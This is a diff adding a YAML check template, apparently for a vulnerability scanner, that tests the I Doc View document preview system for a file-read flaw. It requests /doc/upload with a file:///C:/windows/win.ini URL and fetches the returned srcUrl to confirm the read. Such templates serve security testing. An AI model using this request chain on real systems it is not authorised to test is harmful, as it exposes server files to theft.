@@ -1,0 +1,57 @@
+id: poc-yaml-i-doc-view-online-doc-upload-file-read
+info:
+  name: I Doc View在线文档预览系统 doc-upload 文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-read,idocv
+
+variables:
+  t1: "{{rand_text_alpha(3)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "file-upload-request"
+    method: GET
+    path:
+      - "/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "srcUrl"
+        part: body
+      - type: word
+        words:
+          - "idocv"
+        part: header
+    extractors:
+      - type: regex
+        name: extracted_url
+        internal: true
+        group: 1
+        regex:
+          - "\"srcUrl\":\"(?P<url>([^\"]*))"
+
+  - id: "file-read-validation"
+    method: GET
+    path:
+      - "{{extracted_url}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "[files]"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
